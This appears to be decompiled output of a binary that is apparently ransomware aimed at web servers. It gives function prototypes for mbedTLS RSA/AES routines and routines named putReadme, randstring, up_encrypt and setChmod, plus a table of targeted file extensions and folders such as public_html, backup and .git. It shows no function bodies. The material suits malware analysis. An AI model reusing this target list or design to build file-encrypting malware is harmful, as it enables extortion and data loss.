int32_t mbedtls_pem_init(int32_t * a1);
int32_t mbedtls_pem_read_buffer(int32_t * a1, char * str2, char * str3, int32_t str, int32_t a5, int32_t a6, int32_t * a7);
int32_t mbedtls_pk_decrypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_pk_encrypt(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t mbedtls_pk_free(char * a1);
int32_t mbedtls_pk_info_from_type(int32_t a1);
int32_t mbedtls_pk_init(int32_t * a1);
int32_t mbedtls_pk_load_file(struct _IO_FILE * a1, int32_t * a2, int32_t * a3);
int32_t mbedtls_pk_parse_key(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_pk_parse_keyfile(char * a1, int32_t a2, int32_t a3);
int32_t mbedtls_pk_parse_public_key(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_pk_parse_public_keyfile(char * a1, int32_t a2, int32_t a3);
int32_t mbedtls_pk_parse_subpubkey(int32_t * a1, int32_t a2, int32_t a3);
int32_t mbedtls_pk_setup(int32_t * a1, int32_t a2);
int32_t mbedtls_pkcs12_derivation(char * a1, uint32_t a2, char * a3, uint32_t a4, int32_t a5, char * a6, int32_t a7, uint32_t a8, uint32_t a9, int32_t a10);
int32_t mbedtls_pkcs12_pbe(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t mbedtls_pkcs12_pbe_sha1_rc4_128(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t mbedtls_pkcs5_pbes2(int32_t * a1, int32_t a2, char * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t mbedtls_pkcs5_pbkdf2_hmac(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, uint32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_pkcs5_self_test(int32_t a1);
int32_t mbedtls_ripemd160(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void mbedtls_ripemd160_clone(char * a1, char * a2);
int32_t mbedtls_ripemd160_finish(int32_t * a1, char * a2);
void mbedtls_ripemd160_free(char * a1);
int32_t mbedtls_ripemd160_init(char * a1);
int32_t mbedtls_ripemd160_process(int32_t a1, char * a2);
int32_t mbedtls_ripemd160_self_test(int32_t a1);
void mbedtls_ripemd160_starts(int32_t * a1);
int32_t mbedtls_ripemd160_update(char * a1, char * a2, uint32_t a3);
int32_t mbedtls_rsa_check_privkey(int32_t a1);
int32_t mbedtls_rsa_check_pubkey(int32_t a1);
int32_t mbedtls_rsa_free(int32_t a1, int32_t a2);
int32_t mbedtls_rsa_init(char * a1, int32_t a2, int32_t result);
int32_t mbedtls_rsa_pkcs1_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12);
int32_t mbedtls_rsa_pkcs1_encrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11);
void mbedtls_rsa_pkcs1_sign(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_rsa_pkcs1_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_rsa_private(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mbedtls_rsa_public(int32_t a1, int32_t a2, int32_t a3);
int32_t mbedtls_rsa_rsaes_oaep_decrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t * a7, int32_t a8, int32_t a9, uint32_t a10);
int32_t mbedtls_rsa_rsaes_oaep_encrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, char * a9);
int32_t mbedtls_rsa_rsaes_pkcs1_v15_decrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, uint32_t a8);
int32_t mbedtls_rsa_rsaes_pkcs1_v15_encrypt(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, char * a6, char * a7);
int32_t mbedtls_rsa_rsassa_pkcs1_v15_sign(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, char * a8);
int32_t mbedtls_rsa_rsassa_pkcs1_v15_verify(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t n, int32_t str2, int32_t a8);
void mbedtls_rsa_rsassa_pss_sign(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * a8);
int32_t mbedtls_rsa_rsassa_pss_verify(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t mbedtls_rsa_rsassa_pss_verify_ext(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t mbedtls_rsa_self_test(int32_t a1);
int32_t mbedtls_rsa_set_padding(int32_t result, int32_t a2, int32_t a3);
void (**mbedtls_set_alarm(int32_t a1, int32_t a2))(int32_t);
int32_t mbedtls_sha1(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void mbedtls_sha1_clone(char * a1, char * a2);
int32_t mbedtls_sha1_finish(int32_t * a1, char * a2);
void mbedtls_sha1_free(char * a1);
int32_t mbedtls_sha1_init(char * a1);
int32_t mbedtls_sha1_process(int32_t a1, char * a2);
int32_t mbedtls_sha1_self_test(int32_t a1);
void mbedtls_sha1_starts(int32_t * a1);
int32_t mbedtls_sha1_update(char * a1, char * a2, uint32_t a3);
int32_t mbedtls_sha256(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void mbedtls_sha256_clone(char * a1, char * a2);
int32_t mbedtls_sha256_finish(int32_t * a1, char * a2);
void mbedtls_sha256_free(char * a1);
int32_t mbedtls_sha256_init(char * a1);
int32_t mbedtls_sha256_process(int32_t a1, int32_t a2);
int32_t mbedtls_sha256_self_test(int32_t a1);
int32_t mbedtls_sha256_starts(int32_t * a1, int32_t a2);
int32_t mbedtls_sha256_update(char * a1, char * a2, uint32_t a3);
int32_t mbedtls_sha512(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
void mbedtls_sha512_clone(char * a1, char * a2);
int32_t mbedtls_sha512_finish(int32_t * a1, char * a2, int32_t a3);
void mbedtls_sha512_free(char * a1);
int32_t mbedtls_sha512_init(char * a1);
int32_t mbedtls_sha512_process(int32_t a1, int32_t a2);
int32_t mbedtls_sha512_self_test(int32_t a1);
int32_t mbedtls_sha512_starts(int32_t * a1, int32_t a2);
int32_t mbedtls_sha512_update(char * a1, char * a2, uint32_t a3);
int32_t mbedtls_timing_get_delay(int32_t a1);
int32_t mbedtls_timing_get_timer(int32_t * a1, int32_t a2);
int32_t mbedtls_timing_self_test(int32_t a1);
int32_t mbedtls_timing_set_delay(int32_t result, int32_t a2, int32_t a3, int32_t a4);
int32_t md5_clone_wrap(int32_t a1);
int32_t md5_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t md5_process_wrap(int32_t a1);
int32_t md5_starts_wrap(int32_t a1);
int32_t md5_update_wrap(int32_t a1);
int32_t mgf_mask(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, int32_t a5);
int32_t mpi_check_small_factors(int32_t a1);
int32_t mpi_miller_rabin(int32_t a1, int32_t a2, int32_t a3);
int32_t mpi_montmul(int64_t a1, int32_t result4, int32_t a3, int32_t a4, int32_t a5);
int32_t mpi_write_hlp(int32_t a1, int32_t a2, int32_t a3);
int32_t myrand(int32_t a1, int32_t a2);
int32_t pem_aes_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
char * pem_get_iv(int32_t a1, int32_t a2, int32_t a3);
int32_t pem_pbkdf1(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t pk_get_ecpubkey(int32_t a1, int32_t a2, int32_t a3);
int32_t pk_get_pk_alg(int32_t * a1, int32_t a2, int32_t a3);
int32_t pk_hashlen_helper(void);
int32_t pk_parse_key_pkcs1_der(int32_t a1, int32_t a2, int32_t a3);
int32_t pk_parse_key_pkcs8_encrypted_der(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t pk_parse_key_pkcs8_unencrypted_der(int32_t a1, int32_t a2, int32_t a3);
int32_t pk_parse_key_sec1_der(int32_t a1, int32_t a2, int32_t a3);
int32_t pk_use_ecparams(int32_t a1, int32_t a2);
int32_t pkcs12_pbe_derive_key_iv(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t pop_arg(int32_t a1, int32_t a2, int32_t a3);
int32_t private_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t public_encrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
struct _IO_FILE * putReadme(int32_t a1, int32_t a2, int32_t a3);
int32_t randstring(int32_t a1);
int32_t ripemd160_clone_wrap(int32_t a1);
int32_t ripemd160_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t ripemd160_process_wrap(int32_t a1);
int32_t ripemd160_starts_wrap(int32_t a1);
int32_t ripemd160_update_wrap(int32_t a1);
int32_t rsa_alt_can_do(int32_t a1);
int32_t rsa_alt_check_pair(int32_t a1, int32_t a2);
int32_t rsa_alt_get_bitlen(int32_t * a1);
int32_t rsa_alt_sign_wrap(int32_t * a1, int32_t a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12);
int32_t rsa_can_do(int32_t a1, int32_t a2);
int32_t rsa_decrypt_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t rsa_free_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t rsa_get_bitlen(int32_t a1);
int32_t rsa_verify_wrap(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, uint32_t a6);
int32_t sc_clock_gettime(int32_t a1, int32_t a2);
int32_t setChmod(char * path, int32_t amode, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t sha1_clone_wrap(int32_t a1);
int32_t sha1_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t sha1_process_wrap(int32_t a1);
int32_t sha1_starts_wrap(int32_t a1);
int32_t sha1_update_wrap(int32_t a1);
int32_t sha224_clone_wrap(int32_t a1);
int32_t sha224_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t sha224_process_wrap(int32_t a1);
int32_t sha224_starts_wrap(int32_t a1);
int32_t sha224_update_wrap(int32_t a1);
int32_t sha224_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t sha256_starts_wrap(int32_t a1);
int32_t sha256_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t sha384_clone_wrap(int32_t a1);
int32_t sha384_ctx_free(int32_t a1, int32_t a2, int32_t a3);
int32_t sha384_process_wrap(int32_t a1);
int32_t sha384_starts_wrap(int32_t a1);
int32_t sha384_update_wrap(int32_t a1);
int32_t sha384_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t sha512_starts_wrap(int32_t a1);
int32_t sha512_wrap(int32_t a1, int32_t a2, int32_t a3);
int32_t sighandler(int32_t sig_handler);
int32_t startsWith(char * str, char * a2);
char * up_decrypt(char * str);
char * up_encrypt(char * str);

// --------------------- Global Variables ---------------------

// Detected cryptographic pattern: Hash_constant_words_K_for_SHA_384_and_SHA_512 (64-bit, little endian)
int64_t Hash_constant_words_K_for_SHA_384_and_SHA_512_at_8078ec0[80] = {0x428a2f98d728ae22, 0x7137449123ef65cd, -0x4a3f043013b2c4d1, -0x164a245a7e762444, 0x3956c25bf348b538, 0x59f111f1b605d019, -0x6dc07d5b50e6b065, -0x54e3a12a25927ee8, -0x27f855675cfcfdbe, 0x12835b0145706fbe, 0x243185be4ee4b28c, 0x550c7dc3d5ffb4e2, 0x72be5d74f27b896f, -0x7f214e01c4e9694f, -0x6423f958da38edcb, -0x3e640e8b3096d96c, -0x1b64963e610eb52e, -0x1041b879c7b0da1d, 0xfc19dc68b8cd5b5, 0x240ca1cc77ac9c65, 0x2de92c6f592b0275, 0x4a7484aa6ea6e483, 0x5cb0a9dcbd41fbd4, 0x76f988da831153b5, -0x67c1aead11992055, -0x57ce3992d24bcdf0, -0x4ffcd8376704dec1, -0x40a680384110f11c, -0x391ff40cc257703e, -0x2a586eb86cf558db, 0x6ca6351e003826f, 0x142929670a0e6e70, 0x27b70a8546d22ffc, 0x2e1b21385c26c926, 0x4d2c6dfc5ac42aed, 0x53380d139d95b3df, 0x650a73548baf63de, 0x766a0abb3c77b2a8, -0x7e3d36d1b812511a, -0x6d8dd37aeb7dcac5, -0x5d40175eb30efc9c, -0x57e599b443bdcfff, -0x3db4748f2f07686f, -0x3893ae5cf9ab41d0, -0x2e6d17e62910ade8, -0x2966f9dbaa9a56f0, -0xbf1ca7aa88edfd6, 0x106aa07032bbd1b8, 0x19a4c116b8d2d0c8, 0x1e376c085141ab53, 0x2748774cdf8eeb99, 0x34b0bcb5e19b48a8, 0x391c0cb3c5c95a63, 0x4ed8aa4ae3418acb, 0x5b9cca4f7763e373, 0x682e6ff3d6b2b8a3, 0x748f82ee5defb2fc, 0x78a5636f43172f60, -0x7b3787eb5e0f548e, -0x7338fdf7e59bc614, -0x6f410005dc9ce1d8, -0x5baf9314217d4217, -0x41065c084d3986eb, -0x398e870d1c8dacd5, -0x35d8c13115d99e64, -0x2e794738de3f3df9, -0x15258229321f14e2, -0xa82b08011912e88, 0x6f067aa72176fba, 0xa637dc5a2c898a6, 0x113f9804bef90dae, 0x1b710b35131c471b, 0x28db77f523047d84, 0x32caab7b40c72493, 0x3c9ebe0a15c9bebc, 0x431d67c49c100d4c, 0x4cc5d4becb3e42b6, 0x597f299cfc657e2a, 0x5fcb6fab3ad6faec, 0x6c44198c4a475817}; // 0x8078ec0
// Detected cryptographic pattern: SHA256_Hash_constant_words_K__0x428a2f98_ (32-bit, little endian)
int32_t SHA256_Hash_constant_words_K__0x428a2f98__at_807c200[64] = {0x428a2f98, 0x71374491, -0x4a3f0431, -0x164a245b, 0x3956c25b, 0x59f111f1, -0x6dc07d5c, -0x54e3a12b, -0x27f85568, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, -0x7f214e02, -0x6423f959, -0x3e640e8c, -0x1b64963f, -0x1041b87a, 0xfc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, -0x67c1aeae, -0x57ce3993, -0x4ffcd838, -0x40a68039, -0x391ff40d, -0x2a586eb9, 0x6ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, -0x7e3d36d2, -0x6d8dd37b, -0x5d40175f, -0x57e599b5, -0x3db47490, -0x3893ae5d, -0x2e6d17e7, -0x2966f9dc, -0xbf1ca7b, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, -0x7b3787ec, -0x7338fdf8, -0x6f410006, -0x5baf9315, -0x41065c09, -0x398e870e}; // 0x807c200
int32_t g1 = 0; // eax
int32_t g2 = 0; // ebp
int32_t g3 = 0; // ebx
int32_t g4 = 0; // ecx
int32_t g5 = 0; // edi
int32_t g6 = 0; // edx
int32_t g7 = 0; // esi
int32_t g8 = 0; // esp
char * g9[54] = {
    ".php",
    ".html",
    ".tar",
    ".gz",
    ".sql",
    ".js",
    ".css",
    ".txt",
    ".pdf",
    ".tgz",
    ".war",
    ".jar",
    ".java",
    ".class",
    ".ruby",
    ".rar",
    ".zip",
    ".db",
    ".7z",
    ".doc",
    ".pdf",
    ".xls",
    ".properties",
    ".xml",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".mov",
    ".avi",
    ".wmv",
    ".mp3",
    ".mp4",
    ".wma",
    ".aac",
    ".wav",
    ".pem",
    ".pub",
    ".docx",
    ".apk",
    ".exe",
    ".dll",
    ".tpl",
    ".psd",
    ".asp",
    ".phtml",
    ".aspx",
    ".csv",
    "public_html",
    "www",
    "webapp",
    "backup",
    ".git",
    ".svn"
}; // 0x8077a9c
char * g10[6] = {
    "public_html",
    "www",
    "webapp",
    "backup",
    ".git",
    ".svn"
}; // 0x8077b5c
char * g11 = "\x44\x41\x6a\xc2\xd1\xf5\x3c\x58\x33\x03\x91\x7e\x6b\xe9\xeb\xe0\x48\xe3\x1e\x9e\x25\x67\x18\xf2\x92\x29\x31\x9c\x19\xf1\x5b\xa4\x05\x8c\xcf\xfd\xbb\xcb\x38\x2d\x1f\x6f\x56\x58\x5d\x8a\x4a\xde"; // 0x8077c20
int32_t g12 = 0x2c054cc3; // 0x8077c60
int32_t g13 = -0x597e7f3f; // 0x8078080
int32_t g14 = -0x3ab2e; // 0x80780e0
char * g15 = "\x34\x01\x16\x56\xb4\x29"; // 0x80780f0
int32_t g16 = 0x5e4d195a; // 0x8078100
int32_t g17 = -0x47abe5; // 0x8078140
char * g18 = "\xa0\x54\x30\x3d\x8a\x7e\xa9\x88\x9d\x90\x3e\x07\x7c\x6f\x21\x8f\x20\x20\x45\x4e\x54\x52\x4f\x50\x59\x20\x74\x65\x73\x74\x3a\x20"; // 0x8078150
int32_t g19; // 0x807818c
char * g20 = "\x2a\x86\x48\xce\x3d\x01\x01"; // 0x8078310
int32_t g21 = -0x79b779d6; // 0x8078318
char * g22 = "\x2a\x86\x48\x86\xf7\x0d\x01\x05\x0d"; // 0x8078323
char * g23 = "\xaa\xbb\xcc\x03\x02\x01"; // 0x8078991
int32_t g24 = 3; // 0x80789c0
char * g25 = "\xa9\x99\x3e\x36\x47\x06\x81\x6a\xba\x3e\x25\x71\x78\x50\xc2\x6c\x9c\xd0\xd8\x9d\x84\x98\x3e\x44\x1c\x3b\xd2\x6e\xba\xae\x4a\xa1\xf9\x51\x29\xe5\xe5\x46\x70\xf1\x34\xaa\x97\x3c\xd4\xc4\xda\xa4\xf6\x1e\xeb\x2b\xdb\xad\x27\x31\x65\x34\x01\x6f"; // 0x8078aa0
char * g26 = "\xcb"; // 0x8078cc0
int32_t g27 = 0x428a2f98; // 0x8078ec4
int32_t g28 = 0x23ef65cd; // 0x8078ec8
int32_t g29 = 0x71374491; // 0x8078ecc
int32_t g30 = -0x13b2c4d1; // 0x8078ed0
int32_t g31 = -0x4a3f0431; // 0x8078ed4
int32_t g32 = -0x7e762444; // 0x8078ed8
int32_t g33 = -0x164a245b; // 0x8078edc
int32_t g34 = -0xcb74ac8; // 0x8078ee0
int32_t g35 = 0x3956c25b; // 0x8078ee4
int32_t g36 = -0x49fa2fe7; // 0x8078ee8
int32_t g37 = 0x59f111f1; // 0x8078eec
int32_t g38 = -0x50e6b065; // 0x8078ef0
int32_t g39 = -0x6dc07d5c; // 0x8078ef4
int32_t g40 = -0x25927ee8; // 0x8078ef8
int32_t g41 = -0x54e3a12b; // 0x8078efc
int32_t g42 = 3; // 0x80796c0
int32_t g43 = 5; // 0x8079ba0
int32_t g44 = -1; // 0x8079c74
int32_t g45 = -0x3eb9464f; // 0x8079c8c
int32_t g46 = -0x7d00efee; // 0x8079ca4
int32_t g47 = 0x1e794811; // 0x8079cbc
int32_t g48 = -0x4b2dd7cf; // 0x8079cd4
int32_t g49 = 1; // 0x8079d00
int32_t g50 = 0x2355ffb4; // 0x8079d20
int32_t g51 = 0x115c1d21; // 0x8079d3c
int32_t g52 = 0x5c5c2a3d; // 0x8079d74
int32_t g53 = -1; // 0x8079da0
int32_t g54 = 0x27d2604b; // 0x8079dc0
int32_t g55 = -0x27673d6a; // 0x8079de0
int32_t g56 = 0x37bf51f5; // 0x8079e00
int32_t g57 = -0x39cdaaf; // 0x8079e20
int32_t g58 = -1; // 0x8079e40
int32_t g59 = -0x2c13d511; // 0x8079e80
int32_t g60 = 0x72760ab7; // 0x8079ec0
int32_t g61 = -0x6f15f1a1; // 0x8079f00
int32_t g62 = -0x333ad68d; // 0x8079f40
int32_t g63 = -1; // 0x8079f80
int32_t g64 = 0x6b503f00; // 0x8079fe0
int32_t g65 = -0x3d1a429a; // 0x807a040
int32_t g66 = -0x602e99b0; // 0x807a0a0
int32_t g67 = -0x6ec79bf7; // 0x807a100
int32_t g68 = -0x11c9; // 0x807a144
int32_t g69 = 3; // 0x807a160
int32_t g70 = -0x151f9383; // 0x807a164
int32_t g71 = -0x26a1d063; // 0x807a17c
int32_t g72 = 0x74defd8d; // 0x807a194
int32_t g73 = -0x1a93; // 0x807a1ac
int32_t g74 = 5; // 0x807a1cc
int32_t g75 = -0x49485ba4; // 0x807a1d0
int32_t g76 = 0x556d61a5; // 0x807a1ec
int32_t g77 = 0x769fb1f7; // 0x807a220
int32_t g78 = -977; // 0x807a240
int32_t g79 = 7; // 0x807a264
int32_t g80 = 0x16f81798; // 0x807a280
int32_t g81 = -0x4ef2b48; // 0x807a2a0
int32_t g82 = -0x2fc9bebf; // 0x807a2c0
int32_t g83 = 0x1f6e5377; // 0x807a2e0
int32_t g84 = -0x73f84a; // 0x807a320
int32_t g85 = -0x6531cd9e; // 0x807a340
int32_t g86 = 0x2f046997; // 0x807a360
int32_t g87 = -0x68b7a959; // 0x807a380
int32_t g88 = 0x3107ec53; // 0x807a3a0
int32_t g89 = -0x5afb3ef; // 0x807a420
int32_t g90 = 0x47d4af1e; // 0x807a460
int32_t g91 = 0x263c5315; // 0x807a4a0
int32_t g92 = -0x16fb9a9b; // 0x807a4e0
int32_t g93 = 0x583a48f3; // 0x807a520
int32_t g94 = -0x7fe908dd; // 0x807a5a0
int32_t g95 = -0x434607de; // 0x807a5e0
int32_t g96 = 0x3ad80892; // 0x807a620
int32_t g97 = -0x6356ff97; // 0x807a660
int32_t g98 = 0x58abc9a0; // 0x807a6e0
char * g99 = "\x9a"; // 0x807a720
int32_t g100 = -0x4064cb87; // 0x807a780
char * g101 = "\xc6\xa1\x6a\xb8\xd4\x20\x70\x6f\x0f\x34\xab\x7f\xec\x5a\xdc\xa9\xd8\xca\x3a\x13\x3e\x15\x9c\xa6\xac\x43\xc6\xf8\xa2\xbe\x22\x83\x4a\x4c\x0a\x0a\xff\xb1\x0d\x71\x94\xf1\xc1\xa5\xcf\x73\x22\xec\x1a\xe0\x96\x4e\xd4\xbf\x12\x27\x46\xe0\x87\xfd\xb5\xb3\xe9\x1b\x34\x93\xd5\xbb\x98\xfa\xed\x49\xe8\x5f\x13\x0f\xc8\xa4\x59\xb7\x52\x49\x50\x45\x4d\x44\x31\x36\x30"; // 0x807a7c0
int32_t g102 = 8; // 0x807a820
int32_t g103; // 0x807a840
int32_t g104 = -0x79b779d6; // 0x807aa16
int32_t g105 = -0x79b779d6; // 0x807aa66
int32_t g106 = 0x2030e2b; // 0x807aafa
int32_t g107 = -0x31b779d6; // 0x807ab32
int32_t g108 = -0x79b779d6; // 0x807ab8f
char * g109; // 0x807ab98
char * g115 = "\x2a\x86\x48\x86\xf7\x0d\x01\x05\x0c"; // 0x807badc
char * g116 = "\x2a\x86\x48\x86\xf7\x0d\x02\x07"; // 0x807bae6
int32_t g117 = 20; // 0x807bb00
int32_t g118 = 1; // 0x807bb18
int32_t g119 = 4; // 0x807bb30
int32_t g120 = 8; // 0x807bc50
char * g121 = "\x0c\x60\xc8\x0f\x96\x1f\x0e\x71\xf3\xa9\xb5\x24\xaf\x60\x12\x06\x2f\xe0\x37\xa6"; // 0x807bd40
int32_t g122 = 0; // 0x807bf1c
char * g123 = "\x9c\x11\x85\xa5\xc5\xe9\xfc\x54\x61\x28\x08\x97\x7e\xe8\xf5\x48\xb2\x25\x8d\x31\x0b\xdc\x9d\x2d\x25\x6b\x3e\xe9\xda\xae\x34\x7b\xe6\xf4\xdc\x83\x5a\x46\x7f\xfe\x8e\xb2\x08\xf7\xe0\x5d\x98\x7a\x9b\x04\x4a\x8e\x98\xc6\xb0\x87\xf1\x5a\x0b\xfc\x5d\x06\x89\xef\x49\xd2\xfa\xe5\x72\xb8\x81\xb1\x23\xa8\x5f\xfa\x21\x59\x5f\x36\xf7\x1c\x27\x10\x9c\x69\x2c\x1b\x56\xbb\xdc\xeb\x5b\x9d\x28\x65\xb3\x70\x8d\xbc\x12\xa0\x53\x38\x4a\x9c\x0c\x88\xe4\x05\xa0\x6c\x27\xdc\xf4\x9a\xda\x62\xeb\x2b\xb0\xe2\x0b\x6e\x31\x16\x64\x02\x86\xed\x3a\x87\xa5\x71\x30\x79\xb2\x1f\x51\x89\x9b\x75\x2e\x45\x57\x3d\x4b\x39\xf4\xdb\xd3\x32\x3c\xab\x82\xbf\x63\x32\x6b\xfb\x80"; // 0x807bf40
char * g124 = "\x23\x09\x7d\x22\x34\x05\xd8\x22\x86\x42\xa4\x77\xbd\xa2\x55\xb3\x2a\xad\xbc\xe4\xbd\xa0\xb3\xf7\xe3\x6c\x9d\xa7"; // 0x807c100
int32_t g125 = 0x71374491; // 0x807c204
int32_t g126 = -0x4a3f0431; // 0x807c208
int32_t g127 = -0x164a245b; // 0x807c20c
int32_t g128 = 0x3956c25b; // 0x807c210
int32_t g129 = 0x59f111f1; // 0x807c214
int32_t g130 = -0x6dc07d5c; // 0x807c218
int32_t g131 = -0x54e3a12b; // 0x807c21c
int32_t g132 = 0x67452301; // 0x807c32a
char * g133 = "\x75\xb7\x87\x80\x99\xe0\xc5\x96\x74\x94\xc2\xe7\x10\x4b\x08\x79\xde\x18\x89\x41\xa3\x37\x5d\x3a\x20\x20\x42\x61\x73\x65\x36\x34\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x20\x74\x65\x73\x74\x3a\x20"; // 0x807c342
char * g134 = "\x24\x48\x6e\x56\x87\x62\x5a\xbd\xbf\x17\xd9\xa2\xc4\x17\x1a\x01\x94\xed\x8f\x1e\x11\xb3\xd7\x09\x0c\xb6\xe9\x10\x6f\x22\xee\x13\xca\xb3\x07\x05\x76\xc9\xfa\x31\x6c\x08\x34\xff\x8d\xc2\x6c\x38"; // 0x807c3a0
char * g135 = "\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x7f\x3e\x7f\x7f\x7f\x3f\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x7f\x7f\x7f\x40\x7f\x7f\x7f"; // 0x807c440
int32_t g136 = 2; // 0x807c520
int32_t g137 = 3; // 0x807c528
int32_t g138 = 2; // 0x807c6a0
char g139 = 1; // 0x807d218
char * g140 = "\x12\x9f\x40\xb9\xd2"; // 0x807d268
int32_t g141 = -0x9a50eac; // 0x807d280
char * g142 = "\x01\x02\x04\x07\x08\x0b\x0d\x0e\x10\x13\x15\x16\x19\x1a\x1c\x1f\x20\x23\x25\x26\x29\x2a\x2c\x2f\x31\x32\x34\x37\x38\x3b\x3d\x3e\x40\x43\x45\x46\x49\x4a\x4c\x4f\x51\x52\x54\x57\x58\x5b\x5d\x5e\x61\x62\x64\x67\x68\x6b\x6d\x6e\x70\x73\x75\x76\x79\x7a\x7c\x7f\x80\x83\x85\x86\x89\x8a\x8c\x8f\x91\x92\x94\x97\x98\x9b\x9d\x9e\xa1\xa2\xa4\xa7\xa8\xab\xad\xae\xb0\xb3\xb5\xb6\xb9\xba\xbc\xbf\xc1\xc2\xc4\xc7\xc8\xcb\xcd\xce\xd0\xd3\xd5\xd6\xd9\xda\xdc\xdf\xe0\xe3\xe5\xe6\xe9\xea\xec\xef\xf1\xf2\xf4\xf7\xf8\xfb\xfd\xfe\x20\x20\x41\x45\x53\x2d\x47\x43\x4d\x2d\x25\x33\x64\x20\x23\x25\x64\x20\x28\x25\x73\x29\x3a\x20"; // 0x807dba0
int32_t g143 = 0; // 0x807dc60
int32_t g144 = 0; // 0x807dd20
char * g145; // 0x807dd40
int32_t g146 = 0; // 0x807dd60
int32_t g147 = 0; // 0x807dec0
int32_t g148 = 0; // 0x807ded8
int32_t g149 = 0; // 0x807df00
int32_t g150 = 0; // 0x807e080
int32_t g151 = 0; // 0x807e0c0
int32_t g152 = 0; // 0x807e240
int32_t g153 = 0; // 0x807e258
char * g154; // 0x807e280
